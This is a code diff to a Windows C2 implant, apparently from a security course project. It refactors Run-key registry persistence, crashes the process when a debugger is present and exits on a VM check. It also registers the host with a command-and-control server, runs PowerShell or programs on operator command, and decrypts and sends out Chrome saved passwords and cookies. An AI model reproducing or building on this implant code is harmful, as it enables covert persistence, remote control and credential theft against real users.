@@ -35,6 +35,32 @@ std::string get_privilege_info(){
     return priv_info;
 }
 
+void make_persist(){
+    std::string p = "Split-Path -Path $pwd -Parent";
+    LPSTR pa =  const_cast<char *>(p.c_str());
+    std::istringstream res(runPowershellCommand(pa));
+    std::string resp;
+    res >> resp;
+    resp = resp+ "\\main_implant.exe";
+    std::cout << resp << std::endl;
+    LPCSTR progPath = resp.c_str();
+    HKEY hkey = NULL;
+    LPCSTR path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER,path,&hkey); //Creates a key       
+    LPCSTR name = "MyApp";
+    LONG status = RegSetValueEx(hkey,name, 0, REG_SZ, (BYTE*)progPath, 100 * sizeof(char));
+    if(status == ERROR_SUCCESS){
+        std::cout << "Done" << std::endl;
+    }
+}
+void check_debugger(){
+    if(IsDebuggerPresent()){
+            int *ptr;
+            ptr = NULL;
+            *ptr = 0;
+        }
+}
 int main(){
 //MessageBoxA(NULL,NULL,NULL,MB_YESNO);
 Sleep(100);
@@ -42,21 +68,11 @@ std::string cmd_usr = "$env:UserName";
 LPSTR username_cmd = const_cast<char *>(cmd_usr.c_str());
 std::string username = runPowershellCommand(username_cmd);
 std::cout << username << std::endl;
-LPCSTR progPath = "C:\\Users\\vagrant\\Desktop\\C2-CS501\\implant\\bin\\main_implant.exe";
-HKEY hkey = NULL;
-LPCSTR path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+make_persist();
+check_debugger();
 
-LONG createStatus = RegCreateKey(HKEY_CURRENT_USER,path,&hkey); //Creates a key       
-LPCSTR name = "MyApp";
-LONG status = RegSetValueEx(hkey,name, 0, REG_SZ, (BYTE*)progPath, 100 * sizeof(char));
-if(status == ERROR_SUCCESS){
-    std::cout << "Done" << std::endl;
-}
-exit(1);
-    if(IsDebuggerPresent()){
-        int *ptr = NULL;
-        *ptr = 0;
-    }
+//exit(1);
+    
     CONFIG config;
     std::string info = getInfo();
     // std::cout << info << std::endl;
@@ -73,6 +89,7 @@ exit(1);
 
     std::string sys = j["systeminfo"];
     json sys_info = json::parse(sys);
+    //check VM
     if (sys_info["Hyper-V Requirements"] != "A hypervisor has been detected. Features required for Hyper-V will not be displayed."){
         exit(1);
     }
@@ -80,7 +97,7 @@ exit(1);
     // reg["computer_guid"] = config.computer_guid;
     // std::cout << sys_info["Network Card(s)"] << std::endl;
     
-    std::cout <<  sys_info["Network Card(s)"] << std::endl;
+    //std::cout <<  sys_info["Network Card(s)"] << std::endl;
     reg[ "computer_guid"] = config.computer_guid;
     reg["computer_name"] = sys_info["Host Name"];
     reg["computer_user"] = j["whoami"]; 
@@ -89,15 +106,16 @@ exit(1);
     reg["session_key"] = "askdgjassgf";
 
 
-    std::cout << post(config.c2_fqdn,config.c2_port,"/register",reg.dump()) << std::endl;
+    //std::cout << post(config.c2_fqdn,config.c2_port,"/register",reg.dump()) << std::endl;
     std::string get_cmd_resp = getNextCommand(config);
     json command = json::parse(get_cmd_resp);
-    std::string cmd_result;
-    std::string cmd_text;
+    std::string cmd_result = "";
+    std::string cmd_text = "";
     std::string cmd_id = command["command_id"];
     if(cmd_id != "-1"){
         cmd_text = command["command_text"];
         LPSTR cmd =  const_cast<char *>(cmd_text.c_str());
+        try{
         if (command["command_type"] == "shell"){
             cmd_result = runPowershellCommand(cmd);
         }else if (command["command_type"] == "implant_cmd"){
@@ -107,28 +125,34 @@ exit(1);
                 getMasterKey(masterKey, "vagrant");
                 printUCharAsHex(masterKey, MASTER_KEY_SIZE);
 
-                json jsonResult = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
+                json jsonResult = lootChromePasswords((const unsigned char*) masterKey, username);
                 cmd_result = jsonResult.dump();
-                std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
+                //std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
 
                 delete[] masterKey;
             }else if(command["command_text"]=="situational_awareness"){
                 cmd_result = info;
-                std::cout << info << std::endl;
+                //std::cout << info << std::endl;
             }else if(command["command_text"]=="chrome_cookies"){
                 unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];
 
                 getMasterKey(masterKey, "vagrant");
                 printUCharAsHex(masterKey, MASTER_KEY_SIZE);
 
-                json jsonResult = lootChromeCookies((const unsigned char*) masterKey, "vagrant");
+                json jsonResult = lootChromeCookies((const unsigned char*) masterKey, username);
                 cmd_result = jsonResult.dump();
-                std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
+                //std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
 
                 delete[] masterKey;
             }
         }else if(command["command_type"] == "system_program"){
             cmd_result = runProgram(cmd);
+        }
+        }catch (const std::exception& e){
+            cmd_result = e.what();
+        }
+        if(cmd_result == ""){
+            cmd_result = "Probably wrong command type or command text";
         }
         std::cout << sendCommandResult(config,cmd_id,cmd_result) << std::endl;
     }
